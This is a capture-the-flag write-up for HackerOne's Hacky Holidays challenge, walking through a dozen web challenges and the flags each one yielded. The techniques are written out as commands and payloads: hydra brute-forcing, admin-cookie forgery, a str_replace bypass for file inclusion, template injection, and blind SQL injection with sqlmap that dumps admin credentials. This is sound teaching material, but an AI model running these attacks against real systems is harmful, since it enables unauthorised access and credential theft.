https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS43ZjAwMDAwMi5yYm5kci51cyIsImhhc2giOiI1MzE4NDcxODU0MDBhYjkzOWE5Yzc5NzA3NTAzOGIwYiJ9
https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709
Thanks to everyone who put this together, it was a ton of fun & thanks to the people I asked questions to - ya'll are awesome.
Impact
HUGE



==================================================

Report File: 1069263.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Pretext
Started looking into hacking this autumn and then found out HackerOne was doing a Christmas themed CTF. Further investigation showed that the deplorable Grinch might be up to no good again - Christmas is in danger!
TLDR
Lots of hacking took place, the Grinch was stopped, Christmas saved and all I got for the trouble was these flags (and lots of invites but no Snow Ball Launcher):
Code 515 Bytes
1flag{48104912-28b0-494a-9995-a203d1e261e7}
2flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
3flag{b705fb11-fb55-442f-847f-0931be82ed9a}
4flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
5flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
6flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
7flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
8flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
9flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
10flag{99309f0f-1752-44a5-af1e-a03e4150757d}
11flag{07a03135-9778-4dee-a83c-7ec330728e72}
12flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
First look
A first look at the domain in scope (https://hackyholidays.h1ctf.com/) for the CTF reveals the Grinch network's front to the world, a homepage with nothing but a picture.
<image_0>
Taking a quick look at https://hackyholidays.h1ctf.com/robots.txt to see if there's anything they don't want robots (us) to see, we find the first flag flag{48104912-28b0-494a-9995-a203d1e261e7} and that bots aren't allowed to index /s3cr3t-ar3a.
Secret area
<image_1>
<image_2>
This flag is not visible in the HTML returned by the HTTP request to /s3cr3t-ar3a so it must be hidden in JavaScript somewhere. Further investigation reveals a script tag loading https://hackyholidays.h1ctf.com/assets/js/jquery.min.js and inside, we find the following code:
Code 334 Bytes
1		h1_0 = 'la'
2      , h1_1 = '}'
3      , h1_2 = ''
4      , h1_3 = 'f'
5      , h1_4 = 'g'
6      , h1_5 = '{b7ebcb75'
7      , h1_6 = '8454-'
8      , h1_7 = 'cfb9574459f7'
9      , h1_8 = '-9100-4f91-';
10    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
Running just the variables h1_0 through h1_8 in console.log gives us the flag:
Code 128 Bytes
1console.log( h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
2// flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
The very same page also provides a hint at which the next page will be:
Code 76 Bytes
1document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
next-page - /apps
The /apps endpoint currently (as of writing) provides us with a list of 8 different challenges presented as separate apps. The page itself doesn't hold any flags or vulnerabilities.
(https://hackyholidays.h1ctf.com/apps)
/people-rater - the third flag
The first of the apps is the "Grinch People Rater". It provides a list of names which, when clicked, presents the Grinch's opinion on that particular person.
<image_3>
<image_4>
Inspecting the webpage tells us that each and every button has an associated data-id attribute. Tea Avery, for example, has the id eyJpZCI6Mn0=. Hmm, looks like base64 - let's have a look!
Code 21 Bytes
1atob('eyJpZCI6Mn0=');
Code 12 Bytes
1{
2  "id":2
3}
Oh, nice, a JSON-object providing us with an id, makes sense that it star... wait a minute. Why would it start with id 2? Who is id 1? Just have to check! Enter the following into the browser's console:
Code 62 Bytes
1// encode {"id":1}
2const o = btoa('{"id":1}');
3// eyJpZCI6MX0=
Now, how are people fetched? Source inspection tells us a request is made to https://hackyholidays.h1ctf.com/people-rater/entry?id=IDHERE
Let's plug our encoded object into it and see what it returns!
Code 114 Bytes
1fetch(`https://hackyholidays.h1ctf.com/people-rater/entry?id=${o}`).then(d => d.text()).then(d => console.log(d));
Code 148 Bytes
1{
2  "id":"eyJpZCI6MX0=",
3  "name":"The Grinch",
4  "rating":"Amazing in every possible way!",
5  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
6}
Sweet, the third flag is flag{b705fb11-fb55-442f-847f-0931be82ed9a}!
/swag-shop - the fourth flag
Ah, the swag-shop - I wonder who'd actually be shopping from here. They have only three items, none of them with pictures, and while the 'Snow Ball Launcher' does appeal to me, $395 seems rather steep...
<image_5>
<image_6>
No way to register a user, no obvious credentials work... Hmm. Let's look at the source, then - I want that launcher!
The source code reveals there is some sort of API at https://hackyholidays.h1ctf.com/swag-shop/api/ as the page pulls stock from https://hackyholidays.h1ctf.com/swag-shop/api/stock. There's also https://hackyholidays.h1ctf.com/swag-shop/api/login and https://hackyholidays.h1ctf.com/swag-shop/api/purchase. Neither seem to want to accept my money so let's break out the fuzzer and see what other endpoints are available to us.
Code 104 Bytes
1ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w 
2seclists/Discovery/Web-Content/common.txt
Reveals another, previously unknown, endpoint: https://hackyholidays.h1ctf.com/swag-shop/api/sessions
Accessing the /sessions endpoint gives us a JSON object with quite a few sessions:
Code 2.14 KiB
1{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
They all seem to be base64 encoded, let's have a look at the first one:
Code 475 Bytes
1atob("eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=");
2// {"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}"
Hmm, a null user... Doing this by hand seems like a chore, let's automate it:
Code 175 Bytes
1fetch("https://hackyholidays.h1ctf.com/swag-shop/api/sessions")
2  .then(d => d.json())
3  .then(d => {
4    d.sessions.forEach(obj => {
5      console.log(atob(obj))
6    })
7  });
Result:
Code 1.58 KiB
1{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}
2{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
3{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
4{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}
5{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}
6{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}
7{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}
8{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}
<image_7>
<image_8>
<image_9>
Code 247 Bytes
1{
2	"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3	"username": "grinch",
4	"address": {
5		"line_1": "The Grinch",
6		"line_2": "The Cave",
7		"line_3": "Mount Crumpit",
8		"line_4": "Whoville"
9	},
10	"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
Sweet, the fouth flag flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}! Unfortunately, it doesn't seem like it will let us buy a Snow Ball Launcher - better stop the Grinch and ask Santa for one!
/secure-login - the fifth flag
<image_10>
<image_11>
No dice, go... Wait, username doesn't exist? Perhaps it will tell us when we find a proper username, let's try running hydra.
Code 283 Bytes
1hydra -L /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -p wot 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Username'
2[...]
3[443][http-post-form] host: 18.216.153.32   login: access   password: wot
<image_12>
Let's use hydra again to see if we can get the password too:
Code 286 Bytes
1hydra -l access -P /usr/share/wordlists/rockyou.txt 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Password'
2[443][http-post-form] host: 18.216.153.32   login: access   password: computer
31 of 1 target successfully completed, 1 valid password found
<image_13>
Looking at the source also gives us nothing, but I noticed that the cookie in the HTTP request seems to be a base64 encoded value:
<image_14>
Code 174 Bytes
1atob(decodeURIComponent("eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D"));
2// {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
Apparently, we don't have admin privileges... But it does look like we can change that:
Code 175 Bytes
1encodeURIComponent(btoa('{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'));
2// eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3D%3D
<image_15>
Seems there's a hidden zip-file that the Grinch doesn't want us to have! Let's get it from here!
<image_16>
Surely, this is nothing before the might of John the Ripper, particularly since we'll be cracking locally!
First, we'll need to convert it to a format that John can understand.
Code 54 Bytes
1zip2john my_secure_files_not_for_you.zip > zippass.txt
Next, let John loose on the hash retrieved from the zip-file, using the infamous password list rockyou.txt!
Code 523 Bytes
1john --wordlist=/usr/share/wordlists/rockyou.txt zippass.txt
2Using default input encoding: UTF-8
3Loaded 1 password hash (PKZIP [32/64])
4Will run 4 OpenMP threads
5Press 'q' or Ctrl-C to abort, almost any other key for status
6hahahaha         (my_secure_files_not_for_you.zip)
71g 0:00:00:00 DONE (2020-12-29 11:21) 25.00g/s 409600p/s 409600c/s 409600C/s 123456..cocoliso
8Warning: passwords printed above might not be all those cracked
9Use the "--show" option to display all of the cracked passwords reliably
10Session completed
<image_17>
/my-diary - the sixth flag
Seems like the Grinch has been keeping a diary - I wonder if he's written anything about his upcoming plans to ruin Christmas for everyone?
<image_18>
<image_19>
<image_20>
A blank page. Huh. But is it, though? Let's have a look at the Networks tab of the browser:
<image_21>
Turns out, the page is vulnerable to LFI and we have gotten the source code of the index.php file.
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
<image_22>
First up, the webpage filters anything that is not part of the charset
Code 14 Bytes
1/[A-Za-z0-9.]/
As such, we are limited to A-Z, a-z, 0-9 and .
Next, using str_replace it removes admin.php, followed by removing any occurrences of secretadmin.php. This approach seems secure but it is not - PHP does an initial search of all occurrences of admin.php and then only removes those before doing the same thing for secretadmin.php!
<image_23>
This means that if we put, say, adminadmin.php.php through the filter str_replace("admin.php", "", $page), we will be left with admin.php. We can quickly confirm this is the case by running the following PHP code by using php -a
Code 88 Bytes
1php > $a = "adminadmin.php.php";
2php > print str_replace("admin.php", "", $a);
3admin.php
As such, we can construct the following string to avoid all filters: secretsecretadminadmin.php.phpadminadmin.php.php
Code 160 Bytes
1php > $a = "secretsecretadminadmin.php.phpadminadmin.php.php";
2php > print str_replace("secretadmin.php", "", str_replace("admin.php", "", $a));
3secretadmin.php
<image_24>
Also, it seems the Grinch is planning to DDoS Santa's servers on the 23rd!
/hate-mail-generator - the seventh flag
<image_25>
<image_26>
Looks like he's using a template engine to include HTML files in his outgoing hate mail - let's leave this potential SSTI for now and come back to it later.
<image_27>
Code 1.97 KiB
1<div class="container" style="margin-top:20px">
2    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
3    <h1 class="text-center">New Campaign</h1>
4    <div class="row">
5        <div class="col-md-6 col-md-offset-3">
6                       <form method="post">
7            <div class="panel panel-default" style="margin-top:50px">
8                <div class="panel-heading">New Campaign</div>
9                <div class="panel-body">
10                    <div><label>Name:</label></div>
11                    <div><input class="form-control" name="name" value=""></div>
12                    <div style="margin-top:7px"><label>Subject:</label></div>
13                    <div><input class="form-control" name="subject"></div>
14                    <div style="margin-top:7px"><label>Markup:</label></div>
15                    <div><textarea name="markup" class="form-control" rows="15">Hello {{name}} ....</textarea></div>
16                </div>
17            </div>
18            <div>
19                <input type="button" class="btn btn-primary preview-campaign" value="Preview">
20                <input type="submit" class="btn btn-success pull-right" value="Create">
21            </div>
22            </form>
23        </div>
24    </div>
25</div>
26<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
27    <input type="hidden" name="preview_markup">
28    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
29</form>
30<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
31<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
32<script>
33    $('.preview-campaign').click( function(){
34        $('input[name="preview_markup"]').val( $('textarea[name="markup"]').val(  ) )
35        $('form#previewfrm').submit();
36    });
37</script>
<image_28>
Knowing that we can inject random data through {{}} and actually have the page process it through the preview function, let's see what juicy files we can dig up to use with {{template:}} .
Let's fuzz!
Code 260 Bytes
1ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
2new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
3templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
Templates looks to be just what we're looking for!
Code 691 Bytes
1curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
2<html>
3<head><title>Index of /hate-mail-generator/templates/</title></head>
4<body bgcolor="white">
5<h1>Index of /hate-mail-generator/templates/</h1><hr><pre><a href="../">../</a>
6<a href="cbdj3_grinch_header.html">cbdj3_grinch_header.html</a>                                     20-Apr-2020 10:00                   -
7<a href="cbdj3_grinch_footer.html">cbdj3_grinch_footer.html</a>                                     20-Apr-2020 10:00                   -
8<a href="38dhs_admins_only_header.html">38dhs_admins_only_header.html</a>                                21-Apr-2020 15:29                  46
9</pre><hr></body>
10</html>
Nice, a list of usable templates. Naturally, we'll try accessing 38dhs_admins_only_header.html first:
Code 242 Bytes
1curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html
2<html>
3<head><title>403 Forbidden</title></head>
4<body>
5<center><h1>403 Forbidden</h1></center>
6<hr><center>nginx/1.15.8</center>
7</body>
8</html>
Well, I don't think anyone actually expected that to work. Let's get back to the new campaign page at /hate-mail-generator/new and see what we can cook up!
<image_29>
<image_30>
SUCCE... ?! What? Apparently, not so easy. But, we know the two parameters to the preview function - preview_markupand preview_data from the source code of the new page. Maybe we can trick the page into including the admin-page by providing it as a variable in preview_data and then reflecting that variable in preview_markup. Let's craft preview_data to look like so:
Code 105 Bytes
1{
2  "name":"Alice",
3  "email":"alice@test.com",
4  "winner":"{{template:38dhs_admins_only_header.html}}"
5}
Next, let's modify preview_markup to include our new winner property:
Code 10 Bytes
1{{winner}}
Let's run the request using the following JavaScript from the debug console (press F12) on https://hackyholidays.h1ctf.com/hate-mail-generator/:
Code 570 Bytes
1const previewData = '{"name":"Alice","email":"alice@test.com","winner":"{{template:38dhs_admins_only_header.html}}"}';
2const previewMarkup = '{{winner}}';
3
4const formData = new FormData();
5formData.append('preview_markup', previewMarkup);
6formData.append('preview_data', previewData);
7const body = new URLSearchParams(formData);
8
9fetch('https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview', { method: 'POST', body: new URLSearchParams(formData), headers: { 'content-type':'application/x-www-form-urlencoded'} }).then(d => d.text()).then(d => console.log(d));
This gives us the following response, including the seventh flag flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}:
Code 339 Bytes
1<html>
2<body>
3<center>
4    <table width="700">
5        <tr>
6            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
7        </tr>
8        <tr>
9            <td style="padding:20px 10px 20px 10px">
10                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
Sweet! While we haven't really stopped any emails from going out, we have at least managed to access the admin page!
/forum - the eight flag
Ah yes, because what webpage is complete without a forum to gloat in! There doesn't seem to be anyone active in the forums except for the Grinch himself and Max the dog, though ...
<image_31>
Looking through the forums and fuzzing https://hackyholidays.h1ctf.com/forum/ doesn't actually reveal anything interesting apart from a /phpmyadmin endpoint that seems to be completely unwilling to do anything without proper papers...
Code 398 Bytes
1ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
21                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
32                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
4login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
5phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
<image_32>
<image_33>
* An hour of source code review later *
The forums don't seem to be vulnerable to any particular type of attack, and I can't find any vector to defeat the session hash without actually having an account. Looking at the source for the DB class, I noticed there was no user or password specified for accessing the database.
Code 633 Bytes
1class Db {
2
3    static private $read = '';
4    static private $write = '';
5
6    /**
7     * @return PDO
8     */
9    static public function read(){
10        if( gettype(self::$read) == 'string' ) {
11            self::$read = new DbConnect( false, '', '','' );
12        }
13        return self::$read;
14    }
15
16    public static function closeAll(){
17        self::$read = null;
18        self::$write = null;
19    }
20
21    /**
22     * @return PDO
23     */
24    static public function write(){
25        if( gettype(self::$write) == 'string' ) {
26            self::$write = new DbConnect( true,  '', '','' );
27        }
28        return self::$write;
29    }
30}
<image_34>
Aha! Looking at the older commit ('Initial Code Commit'), bingo:
Code 213 Bytes
1static public function read(){
2        if( gettype(self::$read) == 'string' ) {
3            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
4        }
5        return self::$read;
6    }
We know from the DB::__construct method that the order is $write, $db, $db_user, $db_pass:
Code 222 Bytes
1public function __construct($write, $db, $db_user, $db_pass ){
2        $this->write = $write;
3        $this->db = $db;
4        $this->db_user = $db_user;
5        $this->db_pass = $db_pass;
6        $this->reconnect();
7    }
<image_35>
<image_36>
<image_37>
<image_38>
<image_39>
Oh no, it seems like the Grinch is really going to go through with DDoSing Santa!
At least we got the eight flag, flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}.
/evil-quiz - the ninth flag
As the name implies, the quiz is evil. To the untrained (my) eye, it is just another webpage quiz. You can (I did) spend hours upon hours staring at until it dawns on you (me) that there is something peculiar about how many other players of the same name there are participating in the quiz...
<image_40>
After testing about with SQLi, XSS, brute force on the admin login, trying to forge and guess session variables and what not, I noticed this interesting part on the score page after updating my name with some random SQLi (myuniquename' or 1=1 -- ):
<image_41>
<image_42>
Yup, definitely is vulnerable to a blind boolean based SQLi. I saved the HTTP POST request to https://hackyholidays.h1ctf.com/evil-quiz used to set the name variable from Burp suite as quiz.req and fired up sqlmap with the following options (note: sqlmap needs the request to have the cookie session set to a hash that has completed the quiz at least once!):
Code 159 Bytes
1sqlmap -r ../quiz.req --second-url=https://hackyholidays.h1ctf.com/evil-quiz/score --level=5 --risk=3 --not-string=" 0 other" -p name --dbs --tables --thread=4
Basically, we tell sqlmap to inject through the name parameter and then check the URL supplied through --second-url for results, using the string 0 other as the string to look for to determine a false response. Anything else will be regarded as a trueresponse. sqlmap will also ask whether to follow redirects and if it should merge cookies - answering no is the right way to go.
Quite a few 502s and 500s later, sqlmap finally reports that there are two tables in a database named quiz:
Code 99 Bytes
1[09:33:59] [INFO] retrieved: quiz
2Database: quiz
3[2 tables]
4+-------+
5| admin |
6| quiz  |
7+-------+
Not really interested in the actual quiz anymore, let's have a look at the contents of admin by adding the switches -D quiz -T admin :
Code 227 Bytes
1Database: quiz
2Table: admin
3[1 entry]
4+----+-------------------+----------+
5| id | password          | username |
6+----+-------------------+----------+
7| 1  | S3creT_p4ssw0rd-$ | admin    |
8+----+-------------------+----------+
Entering our credentials into the login box for the admin section at https://hackyholidays.h1ctf.com/evil-quiz/admin, we are greeted with the ninth flag flag{6e8a2df4-5b14-400f-a85a-08a260b59135}:
<image_43>
/signup-manager - the tenth flag
<image_44>
<image_45>
Checking for SQLi, XSS etc again gives nothing - not even XXE works. Shoot. Ah well, let's have a look at the source code, then.
<image_46>
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
<image_47>
<image_48>
admin.php seems interesting but doesn't actually have anything of value for us. Looking through the rest of the files, it quickly becomes evident that only index.php is of any interest to us. In particular, it has all the code for the sign up process and explicitly pads the string to be saved in users.txt to a fixed length and ensures the last letter will be N to deprive us of admin privileges. The relevant code for adding users is:
Code 2.08 KiB
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4    $line .= str_pad( $username,15,"#");
5    $line .= $password;
6    $line .= $random_hash;
7    $line .= str_pad( $age,3,"#");
8    $line .= str_pad( $firstname,15,"#");
9    $line .= str_pad( $lastname,15,"#");
10    $line .= 'N';
11    $line = substr($line,0,113);
12    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
13    return $random_hash;
14}
15[...]
16if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
17            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
18            if (strlen($username) < 3) {
19                $errors[] = 'Username must by at least 3 characters';
20            } else {
21                if (isset($all_users[$username])) {
22                    $errors[] = 'Username already exists';
23                }
24            }
25            $password = md5($_POST["password"]);
26            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
27            if (strlen($firstname) < 3) {
28                $errors[] = 'First name must by at least 3 characters';
29            }
30            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
